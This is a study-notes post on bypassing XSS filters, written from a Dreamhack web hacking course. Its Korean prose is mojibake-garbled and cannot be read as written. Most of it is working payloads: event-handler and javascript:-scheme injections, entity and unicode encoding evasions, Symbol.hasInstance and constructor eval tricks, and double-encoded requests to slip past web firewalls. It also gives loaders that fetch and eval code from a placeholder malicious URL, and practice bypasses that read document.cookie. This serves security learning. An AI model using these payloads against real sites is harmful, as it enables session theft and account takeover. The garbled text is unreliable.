---
title: '[Study] XSS Filtering Bypass'
date: 2023-01-23 00:00:00
categories: [Study, Web Hacking]
tags: [xss]
---

> π‘ [Dreamhack] Web Hacking Advanced - Client Side - XSS Filterfing Bypass I, IIλ₯Ό κ³΅λΆνλ©° μ λ¦¬νμμ΅λλ€.
{: .prompt-info }

<br>

# #1. μ΄λ²€νΈ νΈλ€λ¬ μμ±

---

νκ·Έμ μμ± κ°μΌλ‘ μ€ν¬λ¦½νΈλ₯Ό ν¬ν¨ν  μ μλ κ²½μ°κ° μ‘΄μ¬νλ€. λνμ μΌλ‘ 
**μ΄λ²€νΈ νΈλ€λ¬**λ₯Ό μ§μ νλ `on`μΌλ‘ μμνλ μμ±λ€μ΄ μ‘΄μ¬νλ€. μ΄λ²€νΈ νΈλ€λ¬λ νΉμ  μμμμ λ°μνλ μ΄λ²€νΈλ₯Ό μ²λ¦¬νκΈ° μν΄ μ‘΄μ¬νλ μ½λ°± ννμ νΈλ€λ¬ ν¨μμ΄λ€.

μμ£Ό μ¬μ©λλ μ΄λ²€νΈ νΈλ€λ¬ μμ±: `onload`, `onerror`, `onfocus`

<br>

### onerror μ΄λ²€νΈ νΈλ€λ¬
```html
<!-- μ΄λ―Έμ§ λ‘λ μ±κ³΅ > onerror νΈλ€λ¬ μ€νX -->
<img src="valid" onerror="alert(1)">

<!-- μ΄λ―Έμ§ λ‘λ μ€ν¨ > onerror νΈλ€λ¬ μ€ν -->
<img src="invalid" onerror="alert(1)">
```

<br>

### onfocus μ΄λ²€νΈ νΈλ€λ¬
```html
<!-- autofocus μμ±μ  μ£Όμ΄ μλμΌλ‘ ν¬μ»€μ€λ₯Ό μν΄ -->
<input id="inputBox" onfocus="alert(1)" autofocus>

<!-- id κ°μ μ£Όμ΄ URLμ hash(/#inputBox) λΆλΆμ id κ°μ μλ ₯νμ¬ ν¬μ»€μ€ λλλ‘ μ€μ . -->
<input id="inputBox" onfocus="alert(1)">
```

<br>


# #2. λ¬Έμμ΄ μΉν

---

XSS ν€μλλ₯Ό νν°λ§ν  λ λ¬Έμμ΄μ λ¨μν μΉννκ±°λ μ κ±°νλ λ°©μλ μ¬μ©λκ³€ νλ€.
<u>λ¨μν μμ¬λλ κ΅¬λ¬Έμ μ κ±°ν  κ²½μ° νν°λ§λλ ν€μλ μ¬μ΄μ μλ‘μ΄ νν°λ§ ν€μλλ₯Ό μ½μνλ λ°©μμΌλ‘ μ°ν κ°λ₯νλ€.</u>

### λ¬Έμμ΄ μΉν μ°ν
```javascript
/* νν°λ§ ν¨μ */
function XSSFilter(data){
  return data.replace(/script/gi, '');
}
```
```html
<!-- ν€μλλ₯Ό μ€μ²© μ½μνμ¬ μ°ν -->
<sscriptcript>alert(1)</sscriptcript>
```

<br>


# #3. νμ± νμ΄νΌλ§ν¬

---

HTML λ§ν¬μμμ μ¬μ©λ  μ μλ URLμ νμ± μ½νμΈ λ₯Ό ν¬ν¨ν  μ μλ€. `javascript:` μ€ν€λ§λ URL λ‘λ μ μλ°μ€ν¬λ¦½νΈ μ½λλ₯Ό μ€νν  μ μλλ‘ νλ€.

### URL μ€ν€λ§
λ€μκ³Ό κ°μ΄ `a` νκ·Έλ `iframe` νκ·Έμμ URL μμ±μ μ€ν€λ§λ₯Ό μ¬μ©ν  μ μλ€.
```html
<a href="javascript:alert(1)"></a>
<iframe src="javascript:alert(1)">
```

<br>

### μ κ·ν μ°ν
μ΄λ₯Ό λ°©μ§νκ³ μ XSS ν€μλλ₯Ό νν°λ§ν  λ `javascript:` μ€ν€λ§λ₯Ό νν°λ§νλ κ²½μ°κ° μ‘΄μ¬νλλ°, μ΄λ μ κ·νλ₯Ό μ΄μ©νμ¬ μ°νν  μ μλ κ²½μ°κ° μ‘΄μ¬νλ€. μ κ·ν κ³Όμ μμ `\x01`, `\x04`, `\t`μ κ°μ νΉμ λ¬Έμλ€μ΄ μ κ±°λκ³ , μ€ν€λ§μ λμλ¬Έμκ° ν΅μΌλλ€.
```html
<a href="\1\4jAVasC\triPT:alert(1)"></a>
<iframe src="\1\4jAVasC\triPT:alert(1)">
```

<br>

### HTML Entity Encoding
HTML νκ·Έ μμ± λ΄μμλ HTML Entity Encodingμ μ¬μ©ν  μ μλ€. μ΄λ₯Ό μ΄μ©νμ¬ `javascript:` μ€ν€λ§λ XSS ν€μλλ₯Ό μΈμ½λ©νμ¬ νν°λ§μ μ°νν  μλ μλ€.
```html
<a href="\1&#4;J&#97;v&#x61;sCr\tip&tab;&colon;alert(1)"></a>
<iframe src="\1&#4;J&#97;v&#x61;sCr\tip&tab;&colon;alert(1)">
```

<br>

+) URL μ κ·ν νμ€νΈ
μλ°μ€ν¬λ¦½νΈμμλ `URL` κ°μ²΄λ₯Ό ν΅ν΄ URLμ μ§μ  μ κ·νν  μ μμΌλ©°, `protocol`, `hostname` λ± URLμ κ°μ’ μ λ³΄λ₯Ό μΆμΆν  μ μλ€.
```javascript
function normalizeURL(url) {
    return new URL(url, document.baseURI);
}
normalizeURL('\4\4jAva\tScRIpT:alert(1)')
--> "javascript:alert"
```

<br>


# #4. νκ·Έμ μμ± κΈ°λ° νν°λ§

---

### λμλ¬Έμ μΈμ νν°
λμλ¬Έμλ₯Ό λͺ¨λ κ²μ¬νμ§ μμ κ²½μ° λ€μκ³Ό κ°μ΄ μ°ν κ°λ₯νλ€.
```html
<sCript>alert(1)</scRIPT>
```

<br>

### νΉμ  νκ·Έ λ° μμ± νν°
`script`, `img`, `input`κ³Ό κ°μ νκ·Έλ₯Ό νν°λ§ ν  λ, λ€λ₯Έ νκ·Έλ₯Ό μ¬μ©ν΄ κ³΅κ²©μ μλν  μ μλ€.
```html
<video><source onerror="alert(1)"/></video>
<body onload="alert(1)"/>
```

<br>

`on` μ΄λ²€νΈ νΈλ€λ¬λ₯Ό νν°λ§νκ³ , λ©ν° λΌμΈμ μ§μνλ λ¬Έμλ₯Ό κ²μ¬ν  λ, μλ‘μ΄ inner frameμ μμ±νλ `iframe` νκ·Έλ₯Ό μ΄μ©ν΄ μ°νν  μ μλ€.
```html
<!-- src μμ±μμ νμ± νμ΄νΌλ§ν¬ μ΄μ© -->
<iframe src="javascript:alert(1)">
  
<!-- srcdoc μμ±μ μ΄μ© -->
<iframe srcdoc="<&#x69;mg src=1 &#x6f;nerror=alert(parent.document.domain)>">
```
μμμ `srcdoc` μμ±μ μ΄μ©νμ¬ inner frame λ΄μ μλ‘μ΄ XSS κ³΅κ²© μ½λλ₯Ό μλ ₯ν  μ μλλ° μ΄λ, HTML μμ± λ΄μ λ€μ΄κ°κΈ°μ HTML Entity EncodingμΌλ‘ κΈ°μ‘΄ νν°λ§μ μ°ννλ κ²μ΄ κ°λ₯νλ€.
`parent.alert`λ₯Ό νΈμΆνλ μ΄μ λ μ€ν¬λ¦½νΈκ° νΈμΆλλ μμ­μ μμ λ¬Έμμ μ‘΄μ¬νλ alertλ₯Ό νΈμΆ ν΄μΌνκΈ° λλ¬Έμ΄λ€.

<br>


# #5. μλ°μ€ν¬λ¦½νΈ ν¨μ λ° ν€μλ νν°λ§

---

### Unicode escape sequence
μλ°μ€ν¬λ¦½νΈλ **Unicode escape sequence**λ₯Ό μ§μνλ€. μ΄λ₯Ό μ΄μ©νμ¬ νν°λ§ λ λ¬Έμμ΄μ μ°ννλ κ²μ΄ κ°λ₯νλ€.
(Unicode escape sequenceλ `\uAC00` == `κ°`μ κ°μ΄ λ¬Έμμ΄μμ μ λμ½λ λ¬Έμλ₯Ό μ½λν¬μΈνΈλ‘ λνλΌ μ μλ νκΈ°λ²)

```javascript
"\u0063ookie" // cookie
"cooki\x65"   // cookie
\u0061lert(1) // alert(1)
```

<br>

### Computed member access
μλ°μ€ν¬λ¦½νΈλ **Computed member access**λ₯Ό μ§μνλ€. Computed member accessλ κ°μ²΄μ νΉμ  μμ±μ μ κ·Όν  λ μμ± μ΄λ¦μ λμ μΌλ‘ κ³μ°νλ κΈ°λ₯μ΄λ€.

```javascript
document["coo"+"kie"] == document["cookie"] == document.cookie
```


<br>

π» XSS κ³΅κ²©μ νν μ¬μ©λλ κ΅¬λ¬Έκ³Ό νν°λ§ μ°νλ₯Ό μν΄ μ¬μ©λ  μ μλ λμ²΄ μμ

|κ΅¬λ¬Έ|λμ²΄ κ΅¬λ¬Έ|
|---|--------|
|`alert`, `XMLHttpRequest` λ± λ¬Έμ μ΅μμ κ°μ²΄ λ° ν¨μ|`window['al'+'ert']`, `window['XMLHtt'+'pRequest']` λ± μ΄λ¦ λμ΄μ μ°κΈ°|
|`window`|`self`, `this`|
|`eval(code)`|`Function(code)()`|
|`Function`|`isNaN['constr'+'uctor']` λ± ν¨μμ `constructor` μμ± μ κ·Ό|

<br>

### λ¬Έμμ΄ μ μΈ
νν°λ§ νΉμ μΈμ½λ©/λμ½λ©μ μ΄μ λ‘ νΉμ  λ¬Έμ(`()`, `[]`, `"`, `'` ...)λ₯Ό μ¬μ©νμ§ λͺ»νλ κ²½μ°μ ν΄λΉ λ¬Έμλ₯Ό λμ²΄ν  μ μλ λ°©λ²λ€μ ν΅ν΄ μ°ννμ¬ κ³΅κ²©ν  μ μλ€.

λ°μ΄ν(`"`, `'`)κ° νν°λ§λμ΄ μλ€λ©΄ **ννλ¦Ώ λ¦¬ν°λ΄(Template Literals)**μ μ¬μ©ν  μ μλ€. λ°±ν±(\`)μ μ΄μ©νμ¬ μ μΈν  μ μκ³ , `${}` ννμμ μ΄μ©ν΄ λ€λ₯Έ λ³μλ μμ μ¬μ©ν  μ μλ€.
(ννλ¦Ώ λ¦¬ν°λ΄μ λ΄μ₯λ ννμμ νμ©νλ λ¬Έμμ΄ λ¦¬ν°λ΄λ‘, μ¬λ¬ μ€λ‘ μ΄λ€μ§ λ¬Έμμ΄κ³Ό λ¬Έμλ₯Ό λ³΄κ΄νκΈ° μν κΈ°λ₯μΌλ‘ μ΄μ©ν  μ μλ€.)

<br>

1. **RegExp** κ°μ²΄ μ¬μ©νκΈ°

	RegExp κ°μ²΄λ₯Ό μμ±νκ³  κ°μ²΄μ ν¨ν΄ λΆλΆμ κ°μ Έμ΄μΌλ‘μ¨ λ¬Έμμ΄μ λ§λ€ μ μλ€.
	
    ```javascript
	var foo = /Hello World!/.source; // "Hello World!"
	var bar = /test !/ + [];         // "/test !/"
	```

2. **String.fromCharCode** ν¨μ μ¬μ©

	`String.fromCharCode` ν¨μλ μ λμ½λμ λ²μ μ€ νλΌλ―Έν°λ‘ μ λ¬λ μμ ν΄λΉνλ λ¬Έμλ₯Ό λ°ννλ€.
    
    ```javascript
	var foo = String.fromCharCode(72, 101, 108, 108, 111); // "Hello"
	```
    
3. κΈ°λ³Έ λ΄μ₯ ν¨μλ κ°μ²΄μ λ¬Έμλ₯Ό μ¬μ©νλ λ°©λ²

	λ΄μ₯ ν¨μλ κ°μ²΄λ₯Ό `toString` ν¨μλ₯Ό ν΅ν΄ λ¬Έμμ΄λ‘ λ³κ²½νλ©΄ ννκ° λ¬Έμμ΄λ‘ λ³νλλ€. μνλ λ¬Έμμ΄μ λ§λλλ° νμν λ¬Έμλ€μ ν κΈμμ© κ°μ Έμ λ¬Έμμ΄μ λ§λ€ μ μλ€.
    
    ```javascript
	var baz = history.toString()[8] + // "H"
	(history+[])[9] + // "i"
	(URL+0)[12] + // "("
	(URL+0)[13]; // ")" ==> "Hi()"
	```
    
    - `history.toString()` : `"[object History]"` λ¬Έμμ΄ λ°ν
    - `URL.toString()` : `"function URL () { [native code] }"` λ¬Έμμ΄ λ°ν

4. μ«μ κ°μ²΄μ μ§λ² λ³ν
	
    10μ§μ μ«μλ₯Ό 36μ§μλ‘ λ³κ²½νμ¬ ASCII μμ΄ μλ¬Έμ λ²μλ₯Ό λͺ¨λ μμ±ν  μ μλ€. μ΄λ, `E4X μ°μ°μ ("..")`κ° μ‘΄μ¬νλλ°, μ£Όλ‘ μ  λκ°λ₯Ό μ°κ±°λ μμμ μΌλ‘ μΈμλμ§ μλλ‘ κ³΅λ°±κ³Ό μ μ μ‘°ν©ν΄ μ¬μ©ν  μ μλ€.
    
    ```javascript
	var foo = 29234652..toString(36); // "hello"
	var bar = 29234652 .toString(36); // "hello"
	```

<br>
    
### ν¨μ νΈμΆ

μΌλ°μ μΈ μλ°μ€ν¬λ¦½νΈμ ν¨μ νΈμΆ λ°©λ²

```javascript
alert(1); // Parentheses
alert`1`; // Tagged Templates
```

μκ΄νΈμ λ°±ν± λ¬Έμκ° λͺ¨λ νν°λ§ λμ΄μλ κ²½μ°, λ€μκ³Ό κ°μ λ°©λ²λ€λ‘ μ°νν  μ μλ€.

1. **javascript μ€ν€λ§**λ₯Ό μ΄μ©ν location λ³κ²½

	`javascript:` μ€ν€λ§λ₯Ό μ΄μ©ν΄ `location` κ°μ²΄λ₯Ό λ³μ‘°νλ λ°©μμΌλ‘ μλ°μ€ν¬λ¦½νΈ μ½λ μ€ν.
    
    ```javascript
	location = "javascript:alert\x281\x29;";
	location.href = "javascript:alert\u00281\u0029;";
	location['href'] = "javascript:alert\0501\051;";
    ```

2. **Symbol.hasInstance** μ€λ²λΌμ΄λ©
	
	ECMAScript 6μ μΆκ°λ Symbolμ μμ± λͺμΉ­μΌλ‘ μ¬μ©ν  μ μλ€. `0 instanceof C`λ₯Ό μ°μ°ν  λ, `C`μ `Symbol.hasInstance` μμ±μ ν¨μκ° μμ κ²½μ° λ©μλλ‘ νΈμΆνμ¬ `instanceof` μ°μ°μμ κ²°κ³Ό κ°μΌλ‘ μ¬μ©νκ² λλ€. `instanceof`λ₯Ό μ°μ°νκ² λλ©΄ μ€μ  μΈμ€ν΄μ€ μ²΄ν¬ λμ  μνλ ν¨μλ₯Ό λ©μλλ‘ νΈμΆλλλ‘ ν  μ μλ€.
    
    ```javascript
	"alert\x28document.domain\x29"instanceof{[Symbol.hasInstance]:eval};
	Array.prototype[Symbol.hasInstance]=eval;"alert\x28document.domain\x29"instanceof[];
	```

3. **document.body.innerHTML** μΆκ°

	`document.body.innerHTML`μ μ½λλ₯Ό μΆκ°ν  κ²½μ° μλ‘μ΄ HTML μ½λκ° λ¬Έμμ μΆκ°λκ³ , μ½λλ₯Ό μ€νν  μ μλ€. μ΄λ, `innerHTML`λ‘ HTML μ½λλ₯Ό μ€νν  λμλ λ³΄μ μ `<script>` νκ·Έλ₯Ό μ½μν΄λ μ€νλμ§ μλλ€. λ°λΌμ μ΄λ²€νΈ νΈλ€λ¬λ₯Ό μ΄μ©ν΄ μ½λλ₯Ό μ€νν΄μΌ νλ€.
    
    ```javascript
	document.body.innerHTML += "<img src=x: onerror=alert&#40;1&#41;>";
	documnet.body.innerHTML += "<body src=x: onload=alert&#40;1&#41;>";
	```

<br>


# #6. λλΈ μΈμ½λ©(Double Encoding)

---

μλ ₯ κ²μ¦μ λμ½λ© λ±μ λͺ¨λ  μ μ²λ¦¬ μμμ λ§μΉκ³  μνν΄μΌ νλ€. κ²μ¦μ΄ λλ λ°μ΄ν°λ₯Ό λμ½λ©νμ¬ μ¬μ©ν΄μλ μλλ€.
μΉ λ°©νλ²½μ κ±°μ³ μ νλ¦¬μΌμ΄μμΌλ‘ μ λ¬λλ μΉ μλ²μμ, μΉ λ°©νλ²½μΌλ‘λΆν° ν΅κ³Όν λ°μ΄ν°λ₯Ό λ€μ λμ½λ©ν΄μ μ¬μ©νλ©΄ **[λλΈ μΈμ½λ©](https://owasp.org/www-community/Double_Encoding)**μΌλ‘ μΉ λ°©νλ²½μ κ²μ¦μ μ½κ² μ°νν  μ μλ€.

```
// Failed Request
POST /search?query=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1

// Successful Request
POST /search?query=%253Cscript%253Ealert(document.cookie)%253C/script%253E HTTP/1.1
```

<br>


# #7. κΈΈμ΄ μ ν

---

μ½μν  μ μλ μ½λμ κΈΈμ΄κ° μ νλμ΄ μλ κ²½μ°, λ€λ₯Έ κ²½λ‘λ‘ μ€νν  μΆκ°μ μΈ μ½λ(payload)λ₯Ό URL fragment λ±μΌλ‘ μ½μνκ³  λ³Έ μ½λλ₯Ό μ€ννλ μ§§μ μ½λ(launcher)λ₯Ό μ¬μ©ν  μ μλ€.

### location.hash
Fragmentλ‘ μ€ν¬λ¦½νΈλ₯Ό λκ²¨μ£Όκ³  XSS μ§μ μμ `location.hash`λ‘ fragment λΆλΆμ μΆμΆνμ¬ `eval()` λ‘ μ€ννλ κΈ°λ²μ΄ νν μ¬μ©λλ€.

```
https://example.com/?q=<img onerror="eval(location.hash.slice(1))">#alert(1); 
```

<br>

### μΈλΆ μμμ μ΄μ©ν κ³΅κ²©λ°©μ

```javascript
import('malicious_url');
```

```javascript
var e = document.createElement('script')
e.src = 'malicious_url';
document.appendChild(e);
```

```javascript
fetch('malicious_url').then(x=>eval(x.text()))
```


<br>


# #Practice

---

1. "alert", "window", "document" νν°λ§

	`alert(document.cookie)` μ€ν

	**Filtering function**
    ```javascript
	function XSSFilter(data){
  		if(/alert|window|document/.test(data)){
    		return false;
  		}
  		return true;
	}
	```
    
    **Bypass**
    ```javascript
	// 1) μ λμ½λ μ΄μ©
	\u0061lert(\u0064ocument.cookie);
               
	// 2) this ν€μλλ‘ window κ°μ²΄ μ κ·Ό
	this['al'+'ert'](this['docu'+'ment']['coo'+'kie']);
	```

<br>

2. μ£Όμ ν€μλμ νΉμλ¬Έμ νν°λ§ 

	`alert(document.cookie)` μ€ν

	**Filtering function**
    ```javascript
	function XSSFilter(data){
     	if(/alert|window|document|eval|cookie|this|self|parent|top|opener|function|constructor|[\-+\\<>{}=]/i.test(data)){
          return false;
  		}
  		return true;
	}
	```
    
    **Bypass**
    ```javascript
	// 1) decodeURI ν¨μ μ΄μ©
	Boolean[decodeURI('%63%6F%6E%73%74%72%75%63%74%6F%72')](
      decodeURI('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29'))();
               
	// 2) atob ν¨μ & constructor μμ± μ΄μ©
	Boolean[atob('Y29uc3RydWN0b3I')](atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ'))();
	```
    
    - 1) URL Encodingμ νλ¨μ μ¬μ΄νΈ μ°Έκ³ 
    	https://www.w3schools.com/tags/ref_urlencode.ASP
        https://onlineasciitools.com/url-encode-ascii
    - 2) Base64 κ°μ `btoa('string')` ν¨μ μ΄μ©
    
    
    <br>
    
3. (, ), ", ', \` νν°λ§

	`alert(document.cookie)` μ€ν

	**Filtering function**
    ```javascript
	function XSSFilter(data){
     	if(/[()"'`]/.test(data)){
          return false;
  		}
  		return true;
	}
	```
    
    **Bypass**
    ```javascript
	// 1) RegExp & URL.toString & Symbol.hasInstance
	/alert/.source+[URL+[]][0][12]+/document.cookie/.source+[URL+[]][0][13] instanceof{[Symbol.hasInstance]:eval};

	// 2) javascript μ€ν€λ§λ‘ location λ³κ²½ & RegExp & URL.toString
	location=/javascript:/.source + /alert/.source + [URL+0][0][12] + /document.cookie/.source + [URL+0][0][13];
	```